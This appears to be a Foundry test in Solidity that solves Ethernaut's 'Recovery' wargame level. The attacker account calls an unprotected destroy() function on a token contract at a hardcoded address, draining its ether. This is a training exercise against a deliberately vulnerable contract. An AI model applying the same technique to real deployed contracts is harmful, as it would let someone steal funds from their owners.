// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Ethernaut game components
import {Ethernaut} from "src/core/Ethernaut-08.sol";
import {RecoveryFactory, Recovery, SimpleToken} from "src/levels/17-Recovery/RecoveryFactory.sol";

contract RecoveryTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    /// @dev eve is the attacker
    address payable eve = payable(makeAddr("eve"));
    address bob = makeAddr("bob");

    function setUp() public {
        emit log_string("Setting up Recovery level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_RecoveryExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        RecoveryFactory recoveryFactory = new RecoveryFactory();

        ethernaut.registerLevel(recoveryFactory);

        vm.startPrank(eve);
        vm.deal(eve, 1 ether);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(
            recoveryFactory
        );

        emit log_string("Starting the exploit...");
        emit log_named_address("Eve's address", eve);

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/
        address payable lostTokenAddress = payable(
            address(0x41cFCe597382f595E5030a62Ff8b7C24b40CFE87)
        );
        SimpleToken lostToken = SimpleToken(lostTokenAddress);
        lostToken.destroy(eve);
        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }
}
